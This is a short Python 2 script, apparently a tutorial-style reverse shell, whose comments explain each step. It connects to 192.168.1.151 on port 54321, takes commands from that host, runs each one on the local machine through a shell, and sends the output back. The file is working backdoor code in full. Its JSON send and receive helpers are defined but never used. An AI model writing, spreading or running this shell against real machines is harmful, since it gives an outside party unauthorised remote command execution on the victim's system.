#!/usr/bin/python2

import socket
import subprocess
import json

#these to functions are used to recv and send as much data as you want
def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)
def reliable_recv():
        data = ''
        while True:
                try:
                        #try to recv the data and send it to the shell function
                        data = data + sock.recv(1024)
                        return json.loads(data)
                #if we get a value error that means there is still some bytes left over from recving th>
                except ValueError:
                        #so we continue which goes back to the while loop
                        #this goes on until data the entire data has been sent
                        continue


def shell():
	while True:
		#recv a command of 1024 bytes
		command = sock.recv(1024)
		if command == 'q':
			break
		else:
			#runs a subproccess to execute the command recvied in shell
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			#sets the result to the output of proc as well as adding an error read
			result = proc.stdout.read() + proc.stderr.read()
			sock.send(result)

#sets up socket AF_INET = ip conection sock stream = TCP connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.151',54321))

shell()
sock.close

